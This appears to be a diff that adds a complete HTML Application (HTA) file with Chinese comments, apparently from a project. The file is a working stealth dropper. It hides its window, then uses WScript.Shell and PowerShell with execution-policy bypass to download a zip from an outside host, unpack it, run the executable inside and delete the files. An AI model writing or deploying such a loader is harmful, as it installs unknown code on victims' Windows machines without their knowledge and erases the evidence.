@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>.</title>
+  <hta:application id="oMyApp"
+    applicationname="PowerShell Executer"
+    border="none"
+    borderstyle="normal"
+    caption="no"
+    contextmenu="no"
+    icon="powershell.exe"
+    maximizebutton="no"
+    minimizebutton="no"
+    navigable="no"
+    scroll="no"
+    selection="no"
+    showintaskbar="no"
+    singleinstance="yes"
+    sysmenu="no"
+    version="1.0"
+    windowstate="minimize"
+  />
+</head>
+<body>
+
+  <script language="javascript">
+    window.resizeTo(0,0);
+    window.moveTo(-2000,-2000);
+    var shell = new ActiveXObject("WScript.Shell");               
+    // 創建目錄
+    var execMkdir = shell.run('cmd.exe /c mkdir C:\\ProgramData\\dvixm', 0, true);
+
+    // 下載 zip 文件
+    var execDownload = shell.run('powershell.exe /c Invoke-WebRequest -OutFile C:\\ProgramData\\dvixm\\pw.zip https://cns-project2.onrender.com/pw', 0, true);
+
+    // 解壓 zip 文件
+    var execUnzip = shell.run('powershell.exe -ExecutionPolicy Bypass -Command "Expand-Archive -Path C:\\ProgramData\\dvixm\\pw.zip -DestinationPath C:\\ProgramData\\dvixm\\pw"', 0, true);
+
+    // 執行下載的 exe 文件
+    var execRunExe = shell.run('C:\\ProgramData\\dvixm\\pw\\pw.exe', 0, true);
+
+    // 刪除下載的 zip 文件
+    var execDeleteZip = shell.run('cmd.exe /c del C:\\ProgramData\\dvixm\\pw.zip', 0, true);
+
+    // 刪除解壓的文件夾
+    var execDeleteFolder = shell.run('cmd.exe /c rmdir /s /q C:\\ProgramData\\dvixm', 0, true);
+
+    window.close();
+  </script>
+</body>
+</html>
